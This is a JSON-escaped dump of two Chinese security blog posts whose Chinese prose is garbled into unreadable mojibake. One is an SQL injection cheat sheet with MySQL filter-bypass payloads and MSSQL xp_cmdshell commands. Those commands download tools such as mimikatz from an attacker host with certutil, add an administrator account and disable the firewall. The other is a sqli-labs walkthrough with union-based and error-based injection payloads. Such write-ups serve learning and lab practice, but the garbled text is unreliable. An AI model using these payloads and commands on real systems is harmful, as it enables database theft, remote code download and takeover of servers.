¼çš„è´¦æˆ·ï¼Œä½¿å¾—å‰25ä¸ªå­—ç¬¦åªåŒ…å«æœ‰adminä¸ç©ºæ ¼\nmysql\u0026gt;INSERTINTOusers(username,password)VALUES(\u0026#39;admin 1\u0026#39;,\u0026#39;123456\u0026#39;);QueryOK,1rowaffected(0.001sec)mysql\u0026gt;select*fromusers;+---------------------------+-----------+ |username|password|+---------------------------+-----------+ |admin|rand_pass||admin|123456|+---------------------------+-----------+ 2rowsinset(0.00sec)mysql\u0026gt;select*fromuserswhereusername=\u0026#39;admin\u0026#39;andpassword=\u0026#39;123456\u0026#39;;+---------------------------+----------+ |username|password|+---------------------------+----------+ |admin|123456|+---------------------------+----------+ 1rowinset(0.00sec)å¯ä»¥å‘ç°æˆ‘ä»¬æˆåŠŸæŸ¥æ‰¾åˆ°username=adminçš„è´¦æˆ·ï¼Œåé¢ä¸éœ€è¦ä¸º 1 ï¼Œåªè¦ç”¨ç©ºæ ¼å¡«å……å‰é¢çš„å­—ç¬¦ç›´åˆ°æ»¡è¶³ 25 ä¸ªå­—ç¬¦\nINSERTINTOusers(username,password)VALUES(\u0026#39;admin x\u0026#39;,\u0026#39;hasaki\u0026#39;);ä¸€æ¬¡æ€§æ³¨å…¥å‡ºå…¨éƒ¨ç»“æ„ (SELECT(@)FROM(SELECT(@:=0x00),(SELECT(@)FROM(information_schema.columns)WHERE(table_schema\u0026gt;=@)AND(@)IN(@:=CONCAT(@,0x0a,\u0026#39; [ \u0026#39;,table_schema,\u0026#39; ] \u0026gt;\u0026#39;,table_name,\u0026#39; \u0026gt; \u0026#39;,column_name))))x)å¦‚æœå¯ä»¥å›æ˜¾ï¼Œå¯ä»¥ç”¨è¿™ä¸ª payload ä¸€æ¬¡æ€§å…¨éƒ¨æ³¨å…¥å‡ºè¡¨ç»“æ„\nç»•è¿‡æŠ€å·§ ç©ºæ ¼æ›¿ä»£ %09 %0A %0B %0C %0D %A0 %20 /**/ /*!*/ 1\u0026#39;/*!Union*//*!select*/1,2# 1\u0026#39;/*!Union*/select/*!1,2*/#selectusername()fromuserwhere1=1and2=2å¯ä»¥å†™æˆselect(username())fromuserwhere(1=1)and(2=2)ç»•è¿‡å…³é”®å­— åŒå†™å…³é”®å­— å¯¹äºé’ˆå¯¹æ›¿æ¢å…³é”®å­—çš„ç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒå†™å…³é”®å­—æ¥ç»•è¿‡ï¼Œä¾‹å¦‚uniunionon\nåå…­è¿›åˆ¶ selectafromyzwhereb=0x32;select*fromyzwhereb=char(0x32);select*fromyzwhereb=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)selectcolumn_namefrominformation_schema.tableswheretable_name=\u0026#34;users\u0026#34;selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))ASCII or 1=1å³%6f%72%20%31%3d%31ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸ºCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)ã€‚ åŒé‡ç¼–ç ç»•è¿‡ ?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+ ä¸€äº›unicodeç¼–ç ä¸¾ä¾‹ï¼š å•å¼•å·ï¼š' %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7 ç©ºç™½ï¼š %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0 å·¦æ‹¬å·(: %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8 å³æ‹¬å·): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9 é€—å·ç»•è¿‡ mid(user()from1for1)substr(user()from1for1)selectsubstr(user()from-1)fromyz;selectascii(substr(user()from1for1))\u0026lt;150;åŒæ—¶ä¹Ÿå¯ä»¥åˆ©ç”¨æ›¿æ¢å‡½æ•°selectleft(database(),2)\u0026gt;\u0026#39;tf\u0026#39;;selete*fromtesttablelimit2,1;selete*fromtesttablelimit2offset1;æ¯”è¾ƒç¬¦å·ç»•è¿‡ è¿‡æ»¤äº†\u0026gt;æˆ–è€…\u0026lt;ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨greatestæˆ–è€…least\ngreatest(ascii(mid(user(),0,1)),150)least(ascii(mid(user(),0,1)),150)å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°  strcmp(expr1,expr2)\tå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸€æ ·åˆ™è¿”å› 0 ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå°äºç¬¬äºŒä¸ªåˆ™è¿”å› -1 find_in_set(str,strlist) å¦‚æœç›¸åŒåˆ™è¿”å› 1ï¼Œä¸åŒåˆ™è¿”å› 0  å­—ç¬¦ä¸²è¿æ¥å‡½æ•°  concat(str1,str2) å°†å­—ç¬¦ä¸²é¦–å°¾ç›¸è¿ concat_ws(separator,str1,str2) å°†å­—ç¬¦ä¸²ç”¨æŒ‡å®šè¿æ¥ç¬¦è¿æ¥ group_concat()  è¿ç®—ç¬¦ ç®—æœ¯è¿ç®—ç¬¦ + - * / æ¯”è¾ƒè¿ç®—ç¬¦ = \u0026lt;\u0026gt; != \u0026gt; \u0026lt;  between  select database() between 0x61 and 0x7a; select database() between \u0026lsquo;a\u0026rsquo; and \u0026lsquo;z\u0026rsquo;;   in  select \u0026lsquo;123\u0026rsquo; in (\u0026lsquo;12\u0026rsquo;) =\u0026gt; 0   Like(æ¨¡ç³ŠåŒ¹é…)  select \u0026lsquo;12345\u0026rsquo; like \u0026lsquo;12%\u0026rsquo; =\u0026gt; true   regexp æˆ– rlike(æ­£åˆ™åŒ¹é…)  select \u0026lsquo;123455\u0026rsquo; regexp \u0026lsquo;^12\u0026rsquo; =\u0026gt; true    é€»è¾‘è¿ç®—ç¬¦ notæˆ–! é AND é€»è¾‘ä¸ == \u0026amp;\u0026amp; OR é€»è¾‘æˆ– == || XOR é€»è¾‘å¼‚æˆ– == ^ ä½è¿ç®—ç¬¦ \u0026amp; æŒ‰ä½ä¸ | æŒ‰ä½æˆ– ^ æŒ‰ä½å¼‚æˆ– ! å–å \u0026lt;\u0026lt; å·¦ç§» \u0026gt;\u0026gt;å³ç§» Reference å½“è¡¨åå¯æ§çš„æ³¨å…¥é‡åˆ°äº†Describeæ—¶çš„å‡ ç§æƒ…å†µ\nMySQL Error Based SQL Injection ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰æ€»ç»“\nMySqlæ³¨å…¥å¤‡å¿˜å½•\nSQLæ³¨å…¥å¤‡å¿˜å½•\nSQLæ³¨å…¥ç»•è¿‡æŠ€å·§\nMSSQL Basic ç³»ç»Ÿåº“    ç³»ç»Ÿæ•°æ®åº“ æè¿°     master æ•°æ®åº“ è®°å½• SQL Serverå®ä¾‹çš„æ‰€æœ‰ç³»ç»Ÿçº§ä¿¡æ¯ã€‚è¿™ä¸ªæ•°æ®åº“åŒ…æ‹¬æ‰€æœ‰çš„é…ç½®ä¿¡æ¯ã€ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€å½“å‰æ­£åœ¨æœåŠ¡å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹çš„ä¿¡æ¯ã€‚   msdb æ•°æ®åº“ ç”¨äº SQL Server ä»£ç†è®¡åˆ’è­¦æŠ¥å’Œä½œä¸šã€‚msdbæ•°æ®åº“æ˜¯SQL Serverä¸­çš„ä¸€ä¸ªç‰¹ä¾‹ã€‚å¦‚æœä½ æŸ¥çœ‹è¿™ä¸ªæ•°æ®åº“çš„å®é™…å®šä¹‰ï¼Œä¼šå‘ç°å®ƒå…¶å®æ˜¯ä¸€ ä¸ªç”¨æˆ·æ•°æ®åº“ã€‚ä¸åŒä¹‹å¤„æ˜¯SQL Serveræ‹¿è¿™ä¸ªæ•°æ®åº“æ¥åšä»€ä¹ˆã€‚æ‰€æœ‰çš„ä»»åŠ¡è°ƒåº¦ã€æŠ¥è­¦ã€æ“ä½œå‘˜éƒ½å­˜å‚¨åœ¨msdbæ•°æ®åº“ä¸­ã€‚è¯¥åº“çš„å¦ä¸€ä¸ªåŠŸèƒ½æ˜¯ç”¨æ¥å­˜å‚¨æ‰€æœ‰å¤‡ä»½å†å²ã€‚SQL Server Agentå°†ä¼šä½¿ç”¨è¿™ä¸ªåº“ã€‚   model æ•°æ®åº“ ç”¨ä½œ SQL Serverå®ä¾‹ä¸Šåˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„æ¨¡æ¿ã€‚ å¯¹ model æ•°æ®åº“è¿›è¡Œçš„ä¿®æ”¹ï¼ˆå¦‚æ•°æ®åº“å¤§å°ã€æ’åºè§„åˆ™ã€æ¢å¤æ¨¡å¼å’Œå…¶ä»–æ•°æ®åº“é€‰é¡¹ï¼‰å°†åº”ç”¨äºä»¥ååˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“ã€‚modelæ•°æ®åº“æ˜¯å»ºç«‹æ‰€æœ‰ç”¨æˆ·æ•°æ®åº“æ—¶çš„æ¨¡æ¿ã€‚å½“ä½ å»ºç«‹ä¸€ä¸ªæ–°æ•°æ®åº“æ—¶ï¼ŒSQL Serverä¼šæŠŠmodelæ•°æ®åº“ä¸­çš„æ‰€æœ‰å¯¹è±¡å»ºç«‹ä¸€ä»½æ‹·è´å¹¶ç§»åˆ°æ–°æ•°æ®åº“ä¸­ã€‚åœ¨æ¨¡æ¿å¯¹è±¡è¢«æ‹·è´åˆ°æ–°çš„ç”¨æˆ·æ•°æ®åº“ä¸­ä¹‹åï¼Œè¯¥æ•°æ®åº“çš„æ‰€æœ‰å¤šä½™ç©ºé—´éƒ½å°†è¢«ç©ºé¡µå¡«æ»¡ã€‚   Resource æ•°æ®åº“ ä¸€ä¸ªåªè¯»æ•°æ®åº“ï¼ŒåŒ…å« SQL ServeråŒ…æ‹¬çš„ç³»ç»Ÿå¯¹è±¡ã€‚ ç³»ç»Ÿå¯¹è±¡åœ¨ç‰©ç†ä¸Šä¿ç•™åœ¨ Resource æ•°æ®åº“ä¸­ï¼Œä½†åœ¨é€»è¾‘ä¸Šæ˜¾ç¤ºåœ¨æ¯ä¸ªæ•°æ®åº“çš„ sys æ¶æ„ä¸­ã€‚   tempdb æ•°æ®åº“ ä¸€ä¸ªå·¥ä½œç©ºé—´ï¼Œç”¨äºä¿å­˜ä¸´æ—¶å¯¹è±¡æˆ–ä¸­é—´ç»“æœé›†ã€‚tempdbæ•°æ®åº“æ˜¯ä¸€ä¸ªéå¸¸ç‰¹æ®Šçš„æ•°æ®åº“ï¼Œä¾›æ‰€æœ‰æ¥è®¿é—®ä½ çš„SQL Serverçš„ç”¨æˆ·ä½¿ç”¨ã€‚è¿™ä¸ªåº“ç”¨æ¥ä¿å­˜æ‰€æœ‰çš„ä¸´æ—¶è¡¨ã€å­˜å‚¨è¿‡ç¨‹å’Œå…¶ä»–SQL Serverå»ºç«‹çš„ä¸´æ—¶ç”¨çš„ä¸œè¥¿ã€‚ä¾‹å¦‚ï¼Œæ’åºæ—¶è¦ç”¨åˆ° tempdbæ•°æ®åº“ã€‚æ•°æ®è¢«æ”¾è¿›tempdbæ•°æ®åº“ï¼Œæ’å®Œåºåå†æŠŠç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚æ¯æ¬¡SQL Serveré‡æ–°å¯åŠ¨ï¼Œå®ƒéƒ½ä¼šæ¸…ç©ºtempdbæ•°æ®åº“å¹¶é‡å»ºâ—Šæ°¸è¿œä¸è¦åœ¨tempdbæ•°æ®åº“å»ºç«‹éœ€è¦æ°¸ä¹…ä¿å­˜çš„è¡¨ã€‚    æ³¨é‡Š    å‚æ•° é£æ ¼     /* Cè¯­è¨€é£æ ¼   \u0026ndash; SQLæ³¨é‡Šé£æ ¼   ;%00 ç©ºå­—èŠ‚    æŸ¥è¯¢è¯­å¥ ä¸»æœºå select @@SERVERNAME; æ•°æ®åº“ç‰ˆæœ¬ select @@VERSION æ•°æ®åº“å select db_name() æ•°æ®åº“ipåœ°å€ select local_net_address from sys.dm_exec_connextions where Session_id=@@spid æš´å½“å‰è¡¨ä¸­çš„åˆ— article.asp?id=6 group by admin.username having 1=1-- article.asp?id=6 group by admin.username,admin.password having 1=1-- æš´ä»»æ„è¡¨å’Œåˆ— and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)\u0026gt;1 and (select top col_name(object_id('admin'),N) from sysobjects)\u0026gt;1 æš´æ•°æ®åº“æ•°æ® and (select top 1 password from admin where id=N)\u0026gt;1 Exmaples query: SELECT username, password FROM Users WHERE id = '1'; 1' HAVING 1=1 -- é”™è¯¯ 1' GROUP BY username HAVING 1=1-- -- é”™è¯¯ 1' GROUP BY username, password HAVING 1=1-- -- æ­£ç¡® Group Byå¯ä»¥ç”¨æ¥æµ‹è¯•åˆ—å USE master GO RECONFIGURE --å…ˆæ‰§è¡Œä¸€æ¬¡åˆ·æ–°ï¼Œå¤„ç†ä¸Šæ¬¡çš„é…ç½® GO EXEC sp_configure 'show advanced options',1 --å¯ç”¨xp_cmdshellçš„é«˜çº§é…ç½® GO RECONFIGURE --åˆ·æ–°é…ç½® GO EXEC sp_configure 'xp_cmdshell',1 --æ‰“å¼€xp_cmdshell,å¯ä»¥è°ƒç”¨SQLç³»ç»Ÿä¹‹å¤–çš„å‘½ä»¤ GO RECONFIGURE GO --ä½¿ç”¨xp_cmdshellåœ¨Dç›˜åˆ›å»ºä¸€ä¸ªmyfile æ–‡ä»¶å¤¹ EXEC xp_cmdshell 'mkdir d:\\myfile',no_output --[no_output]è¡¨ç¤ºæ˜¯å¦è¾“å‡ºä¿¡æ¯ GO sp_configure 'show advanced options',1; (è®°å¾—reconfigure) sp_configure 'xp_cmdshell',1;ï¼ˆè®°å¾—reconfigureï¼‰å¯ç”¨xp_cmdshell exec xp_cmdshell 'dir c:\\ /s /b |findstr \u0026quot;key\u0026quot;|findstr \u0026quot;txt\u0026quot;'; æ‰¾åˆ°keyçš„ä½ç½® exec xp_cmdshell 'type keyä½ç½®\u0026quot;'; ç›´æ¥è¯»keyå†…å®¹ï¼Œä¸è¿‡ä¸€èˆ¬ä¸ä¼šè®©ä½ æœ‰ç›´æ¥è¯»çš„æƒé™ exec xp_cmdshell 'cacls c:\\ /s /b |findstr \u0026quot;key\u0026quot;|findstr \u0026quot;txt\u0026quot; /E /G adminstrator:F'; æ”¹å˜æ–‡ä»¶æ“ä½œæƒé™ï¼ŒFæ˜¯æ‰€æœ‰æƒé™ï¼Œæ”¹å˜æƒé™åå†è¯»å°±èƒ½æˆåŠŸ exec xp_cmdshell 'certutil -urlcache -f -split http://æœ¬æœº:8000/3389.exe'; è¿™é‡Œçš„certutilçš„æ–¹å¼ä¸åŸºç¡€é¢˜4ä¸­çš„curlæ€è·¯ç›¸åŒï¼Œå¯å‚è€ƒã€‚è¿™é‡Œä¸Šä¼ çš„æ˜¯å¼€å¯3389çš„å·¥å…·ã€‚ exec xp_cmdshell 'net user username password /add';exec xp_cmdshell 'net localgroup administrators username /add';åˆ›å»ºè´¦æˆ· exec xp_cmdshell 'netsh firewall set opmode disable'; å¦‚æœç›®æ ‡å¼€äº†é˜²ç«å¢™ï¼Œé‚£ä¹ˆå³ä½¿å¼€å¯3389ç«¯å£ä¹Ÿæ— æ³•è¿æ¥ï¼Œè¿™æ¡å‘½ä»¤ç”¨äºå…³é—­é˜²ç«å¢™ã€‚ exec xp_cmdshell 'certutil -urlcache -f -split http://æœ¬æœº:8000/mimikazts.exe';å¦‚æœä¸èƒ½å»ºç«‹è´¦æˆ·ï¼Œé‚£ä¹ˆéœ€è¦å·¥å…·å»ç ´è§£ç³»ç»Ÿè´¦æˆ·çš„å¯†ç ã€‚è¿™é‡Œä½¿ç”¨çš„mimikaztsã€‚ exec master..xp_cmdshell â€˜dir â€œC:\\Documents and Settings\\Administrator\\æ¡Œé¢\\â€ /A -D /Bâ€™ exec xp_cmdshell â€˜type â€œC:\\Documents and Settings\\Administrator\\æ¡Œé¢\\key.txtâ€â€˜ Reference ã€æŠ€æœ¯åˆ†äº«ã€‘MSSQL æ³¨å…¥æ”»å‡»ä¸é˜²å¾¡\n","date":"2019-03-06T15:33:04Z","permalink":"https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/","title":"Sqlæ³¨å…¥å¤‡å¿˜å½•"},{"content":"Sqli-lab Less54-65 writeup\nBasic showdatabases;//æŸ¥çœ‹æ•°æ®åº“usexxx;//ä½¿ç”¨æŸä¸ªæ•°æ®åº“showtables;//æŸ¥çœ‹è¯¥æ•°æ®åº“çš„æ•°æ®è¡¨descxxx;//æŸ¥çœ‹è¯¥æ•°æ®è¡¨çš„ç»“æ„select*fromxxx;//æŸ¥æ‰¾æŸä¸ªæ•°æ®è¡¨çš„æ‰€æœ‰å†…å®¹selectschema_namefrominformation_schema.schemata;//çŒœæ•°æ®åº“selecttable_namefrominformation_schema.tableswheretable_schema=\u0026#39;xxx\u0026#39;;//çŒœæŸæ•°æ®åº“çš„æ•°æ®è¡¨Selectcolumn_namefrominformation_schema.columnswheretable_name=\u0026#39;xxx\u0026#39;;//çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—left(a,b);//ä»å·¦ä¾§æˆªå–açš„å‰bä½mid(column_name,start[,length]);//ä»ä½ç½®startå¼€å§‹ï¼Œæˆªå–column_nameå­—ç¬¦ä¸²çš„lengthä½ï¼Œä¸substrä½œç”¨ç›¸åŒsubstr(string,start,length);//ä»ä½ç½®startå¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²stringçš„lengthé•¿åº¦ï¼Œä¸midä½œç”¨ç›¸åŒascii();//å°†æŸä¸ªå­—ç¬¦è½¬æ¢æˆasciiç ord();//å°†æŸä¸ªå­—ç¬¦è½¬æ¢æˆasciiç ï¼ŒåŒascii()Challenges Less-54 $sql=\u0026#34;SELECT * FROM security.users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; æ²¡ä»€ä¹ˆè¿‡æ»¤ï¼Œç›´æ¥ä¸Š\n0' union select 1,group_concat(schema_name),2 from information_schema.schemata;%23 å¾—åˆ°\nYour Login name:information_schema,challenges,mysql,performance_schema,security Your Password:2 çˆ†ç ´è¡¨\n0\u0026#39; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=\u0026#39;challenges\u0026#39;;%23 å¾—åˆ°\nYour Login name:QGVTNCJQK6 Your Password:2 çˆ†ç ´åˆ—\n0' union select 1,group_concat(column_name),2 from information_schema.columns where table_name='QGVTNCJQK6';%23 å¾—åˆ°\nYour Login name:id,sessid,secret_9YQQ,tryy Your Password:2 çˆ†ç ´å†…å®¹\n0' union select id,secret_9YQQ,tryy from QGVTNCJQK6;%23 å¾—åˆ°\nYour Login name:UEGTp3YhAO1wSaVNixYIWwMl Your Password:3 Less-55 $sql=\u0026#34;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1\u0026#34;; ä¹Ÿæ˜¯æ²¡ä»€ä¹ˆè¿‡æ»¤ï¼Œç›´æ¥ä¸Š\n0) union select 1,group_concat(schema_name),2 from information_schema.schemata;%23 Your Login name:information_schema,challenges,mysql,performance_schema,security 0) union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='challenges';%23 Your Login name:HSTKPKBJZX 0) union select 1,group_concat(column_name),2 from information_schema.columns where table_name='HSTKPKBJZX';%23 Your Login name:id,sessid,secret_Y1KS,tryy 0) union select id,secret_Y1KS,tryy from HSTKPKBJZX;%23 Your Login name:BsZ12SElz8qNeK2rvFOTYpkb Less-56 $sql=\u0026#34;SELECT * FROM security.users WHERE id=(\u0026#39;$id\u0026#39;) LIMIT 0,1\u0026#34;; 0') union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='challenges';%23 Your Login name:70ULR981EI 0') union select 1,group_concat(column_name),2 from information_schema.columns where table_name='70ULR981EI';%23 Your Login name:id,sessid,secret_KPCG,tryy 0') union select id,secret_KPCG,tryy from 70ULR981EI;%23 Your Login name:t8Q1iKTajlerR65fY1P8Lu8I Less-57 $id= \u0026#39;\u0026#34;\u0026#39;.$id.\u0026#39;\u0026#34;\u0026#39;; // Querry DB to get the correct output $sql=\u0026#34;SELECT * FROM security.users WHERE id=$idLIMIT 0,1\u0026#34;; å¢åŠ äº†\u0026quot;\n0\u0026quot; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='challenges';%23 Your Login name:28YHZGI481 0\u0026quot; union select 1,group_concat(column_name),2 from information_schema.columns where table_name='28YHZGI481';%23 Your Login name:id,sessid,secret_152D,tryy 0\u0026quot; union select id,secret_152D,tryy from 28YHZGI481;%23 Your Login name:u1TfmRa1qunL2c4bGqZv4H6J Less-58 $sql=\u0026#34;SELECT * FROM security.users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \u0026#39;\u0026lt;font color= \u0026#34;#00FFFF\u0026#34;\u0026gt;\u0026#39;;\t$unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = array_reverse($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; print_r(mysql_error()); echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } å¯ä»¥çœ‹åˆ°ï¼ŒæŸ¥è¯¢ç»“æœè¢«ç”¨ä½œæ•°ç»„åºå·ï¼Œè¾“å‡ºè¢«æ”¹äº†ï¼Œä½†æ˜¯mysql_error()è¢«æ‰“å°äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨æŠ¥é”™æ³¨å…¥\n0' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1);%23 XPATH syntax error: '~HG2RC34XP0~' 0' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='HG2RC34XP0'),0x7e),1);%23 XPATH syntax error: '~id,sessid,secret_7IXP,tryy~' 0' and updatexml(1,concat(0x7e,(select secret_7IXP from HG2RC34XP0),0x7e),1);%23 XPATH syntax error: '~m20SLP9m0za56xuhE7s1awqR~' Less-59 // Querry DB to get the correct output $sql=\u0026#34;SELECT * FROM security.users WHERE id=$idLIMIT 0,1\u0026#34;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \u0026#39;\u0026lt;font color= \u0026#34;#00FFFF\u0026#34;\u0026gt;\u0026#39;;\t$unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = array_reverse($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; print_r(mysql_error()); echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } è¿˜æ˜¯æŒ‰ç…§ä¹‹å‰çš„ç”¨æŠ¥é”™æ³¨å…¥\n0 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1);%23 XPATH syntax error: '~EANMX28TXI~' 0 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='EANMX28TXI'),0x7e),1);%23 XPATH syntax error: '~id,sessid,secret_Z6IM,tryy~' 0 and updatexml(1,concat(0x7e,(select secret_Z6IM from EANMX28TXI),0x7e),1);%23 XPATH syntax error: '~tEwpAjainXQeyDLGeSG1nuok~' Less-60 $id = \u0026#39;(\u0026#34;\u0026#39;.$id.\u0026#39;\u0026#34;)\u0026#39;; // Querry DB to get the correct output $sql=\u0026#34;SELECT * FROM security.users WHERE id=$idLIMIT 0,1\u0026#34;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \u0026#39;\u0026lt;font color= \u0026#34;#00FFFF\u0026#34;\u0026gt;\u0026#39;;\t$unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = array_reverse($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; print_r(mysql_error()); echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } ç›´æ¥åŠ ä¸Š\u0026quot;)ç»•è¿‡ï¼Œä¾ç„¶å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥\n0\u0026quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1);%23 XPATH syntax error: '~5OJBK8U9XQ~' 0\u0026quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='5OJBK8U9XQ'),0x7e),1);%23 XPATH syntax error: '~id,sessid,secret_8GHX,tryy~' 0\u0026quot;) and updatexml(1,concat(0x7e,(select secret_8GHX from 5OJBK8U9XQ),0x7e),1);%23 XPATH syntax error: '~Ij8p6anZKPghpsC4S5Ti9mgi~' Less-61 // Querry DB to get the correct output $sql=\u0026#34;SELECT * FROM security.users WHERE id=((\u0026#39;$id\u0026#39;)) LIMIT 0,1\u0026#34;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \u0026#39;\u0026lt;font color= \u0026#34;#00FFFF\u0026#34;\u0026gt;\u0026#39;;\t$unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = array_reverse($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } else { echo \u0026#39;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34;\u0026gt;\u0026#39;; print_r(mysql_error()); echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } ç›´æ¥åŠ ä¸Š'))ç»•è¿‡ï¼Œä¾ç„¶å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥\n0')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1);%23 XPATH syntax error: '~MP94IBBMTL~' 0')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='MP94IBBMTL'),0x7e),1);%23 XPATH syntax error: '~id,sessid,secret_QN8H,tryy~' 0')) and updatexml(1,concat(0x7e,(select secret_QN8H from MP94IBBMTL),0x7e),1);%23 XPATH syntax error: '~CieVXfic1dl9FuqHdChc2we3~' Less-62 // Querry DB to get the correct output $sql=\u0026#34;SELECT * FROM security.users WHERE id=(\u0026#39;$id\u0026#39;) LIMIT 0,1\u0026#34;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \u0026#39;\u0026lt;font color= 